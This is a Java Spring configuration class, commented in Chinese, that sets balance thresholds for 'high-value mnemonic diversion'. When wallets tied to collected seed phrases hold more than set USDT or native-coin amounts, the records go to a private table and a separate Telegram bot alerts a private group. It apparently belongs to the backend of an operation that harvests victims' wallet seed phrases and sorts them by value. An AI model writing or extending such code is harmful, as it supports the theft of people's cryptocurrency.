package com.consumer.config;

import lombok.Data;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.stereotype.Component;

import java.math.BigDecimal;
import java.util.HashMap;
import java.util.Map;

/**
 * 高额助记词分流：USDT 合计或任一条原生币超阈值 → 隐私群通知 + 迁 private_mnemonic。
 */
@Data
@Component
@ConfigurationProperties(prefix = "maxnotice")
public class MaxNoticeProperties {

    /** 总开关；false 时完全走原渠道通知逻辑 */
    private boolean enabled = true;

    /** 各链 USDT 合计大于该值则触发高额流程 */
    private BigDecimal usdtSumThreshold = new BigDecimal("1000");

    /**
     * 各链原生币单独阈值（key 小写：tron/eth/bsc/btc/sol）。
     * 未配置或 ≤0 的链不做原生币判定。
     */
    private Map<String, BigDecimal> nativeThresholds = new HashMap<>();

    /** 高额专用飞机 bot token（与渠道 bot 分离） */
    private String tgBotToken = "";

    /** 高额专用飞机群 id */
    private String tgGroupId = "";

    public boolean isPrivateTgConfigured() {
        if (tgBotToken == null || tgBotToken.trim().isEmpty()
                || tgGroupId == null || tgGroupId.trim().isEmpty()) {
            return false;
        }
        String token = tgBotToken.trim();
        String group = tgGroupId.trim();
        // 防配反：token 形如 123456:AA...；群 id 一般为数字（可带负号）
        if (!token.contains(":") || group.contains(":")) {
            return false;
        }
        return true;
    }
}
